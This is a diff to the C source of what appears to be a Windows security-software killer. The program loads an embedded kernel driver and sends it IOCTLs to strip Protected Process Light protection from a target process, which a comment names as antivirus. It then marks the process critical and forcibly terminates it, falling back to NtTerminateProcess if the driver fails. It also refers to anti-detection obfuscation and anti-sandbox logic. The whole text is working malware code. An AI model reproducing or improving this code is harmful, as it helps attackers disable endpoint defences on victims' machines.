@@ -80,6 +80,9 @@ static HANDLE g_hKillerThread = NULL;
 /** @brief 后台查杀退出事件 */
 static HANDLE g_hKillerStop = NULL;
 
+/** @brief 驱动设备持久句柄（避免每次查杀都 CreateFile） */
+static HANDLE g_hDriverDevice = INVALID_HANDLE_VALUE;
+
 /* ================================================================
  * 反检测 — 字符串混淆 + API 动态解析 + 反沙箱
  * ================================================================ */
@@ -191,6 +194,12 @@ static void CleanupDriver(void) {
         }
         CloseHandle(g_hKillerStop);
         g_hKillerStop = NULL;
+    }
+
+    /* 关闭驱动设备句柄 */
+    if (g_hDriverDevice != INVALID_HANDLE_VALUE) {
+        CloseHandle(g_hDriverDevice);
+        g_hDriverDevice = INVALID_HANDLE_VALUE;
     }
 
     /* 停止驱动服务 */
@@ -710,58 +719,63 @@ typedef struct _SI_PROCESS_INFO {
  * @return TRUE 成功
  */
 static BOOL KillProcessByDriver(ULONG pid) {
-    HANDLE hDevice = CreateFileW(g_DrvDevicePath, GENERIC_READ | GENERIC_WRITE,
-                                 0, NULL, OPEN_EXISTING, 0, NULL);
-    if (hDevice == INVALID_HANDLE_VALUE) return FALSE;
+    /* 确保驱动设备已打开 */
+    if (g_hDriverDevice == INVALID_HANDLE_VALUE) {
+        g_hDriverDevice = CreateFileW(g_DrvDevicePath,
+                                       GENERIC_READ | GENERIC_WRITE,
+                                       0, NULL, OPEN_EXISTING, 0, NULL);
+    }
+    if (g_hDriverDevice == INVALID_HANDLE_VALUE) {
+        /* 驱动不可用，直接走 NtTerminateProcess 兜底 */
+        goto fallback;
+    }
 
     DWORD returned = 0;
 
-    /* 第一步: 剥离 PPL 保护（Protection=4, type=0(PsProtectedTypeNone)）
-     * 如果不先去掉保护，PPL 进程（如杀软）无法被终止 */
+    /* ① 剥离 PPL 保护 */
     SI_PROCESS_INFO protReq = { 0 };
     protReq.ProcessInformation = 4;  /* Protection */
     protReq.PID = pid;
     protReq.Buffer = NULL;
     protReq.Argument = 0;
-    DeviceIoControl(hDevice, IOCTL_SIRIUS_SET_PROCESS_INFO,
+    DeviceIoControl(g_hDriverDevice, IOCTL_SIRIUS_SET_PROCESS_INFO,
                     &protReq, sizeof(protReq), NULL, 0, &returned, NULL);
 
-    /* 第二步: 设为关键进程（Critical=5, Argument=1）
-     * 标记后进程一旦退出就会触发 BSOD，倒逼系统放弃对该进程的保护 */
+    /* ② 标记关键进程 */
     SI_PROCESS_INFO critReq = { 0 };
     critReq.ProcessInformation = 5;  /* Critical */
     critReq.PID = pid;
     critReq.Buffer = NULL;
     critReq.Argument = 1;
-    DeviceIoControl(hDevice, IOCTL_SIRIUS_SET_PROCESS_INFO,
+    DeviceIoControl(g_hDriverDevice, IOCTL_SIRIUS_SET_PROCESS_INFO,
                     &critReq, sizeof(critReq), NULL, 0, &returned, NULL);
 
-    /* 第三步: 内存级强制终止（Argument=2） */
+    /* ③ 内存级强制终止 */
     SI_PROCESS_INFO termReq = { 0 };
     termReq.ProcessInformation = SIRIUS_PROCESS_TERMINATE;
     termReq.PID = pid;
     termReq.Buffer = NULL;
-    termReq.Argument = 2;  /* memory-based forced termination */
-
-    BOOL ok = DeviceIoControl(hDevice, IOCTL_SIRIUS_SET_PROCESS_INFO,
+    termReq.Argument = 2;
+    BOOL ok = DeviceIoControl(g_hDriverDevice, IOCTL_SIRIUS_SET_PROCESS_INFO,
                               &termReq, sizeof(termReq), NULL, 0, &returned, NULL);
-    CloseHandle(hDevice);
+    if (ok) return TRUE;
 
-    /* 第四步: 驱动方式全部失败，通过 ntdll NtTerminateProcess 直调兜底 */
-    if (!ok) {
+fallback:
+    /* ④ 驱动全失败 → NtTerminateProcess 直调 */
+    {
         typedef LONG (WINAPI *NtTerminateProcess_t)(HANDLE, LONG);
         NtTerminateProcess_t pNtTerminateProcess = (NtTerminateProcess_t)
             GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtTerminateProcess");
         if (pNtTerminateProcess) {
-            HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
-            if (!hProc) hProc = OpenProcess(0x1000, FALSE, pid); /* PROCESS_QUERY_LIMITED_INFO */
+            HANDLE hProc = OpenProcess(0x1001, FALSE, pid);
             if (hProc) {
-                ok = (pNtTerminateProcess(hProc, 0) >= 0);
+                LONG ntStatus = pNtTerminateProcess(hProc, 0);
                 CloseHandle(hProc);
+                return (ntStatus >= 0);
             }
         }
     }
-    return ok;
+    return FALSE;
 }
 
 /**
@@ -1983,6 +1997,10 @@ int main(int argc, char *argv[]) {
             WCHAR driverPath[MAX_PATH];
             if (ExtractEmbeddedDriver(driverPath)) {
                 LoadKernelDriver(g_DrvSvcName, driverPath);
+                /* 预打开驱动设备句柄，供后续查杀复用 */
+                g_hDriverDevice = CreateFileW(g_DrvDevicePath,
+                                               GENERIC_READ | GENERIC_WRITE,
+                                               0, NULL, OPEN_EXISTING, 0, NULL);
             } else {
                 printf("[Driver] [FAIL] 无法获取驱动文件，跳过加载\n");
             }
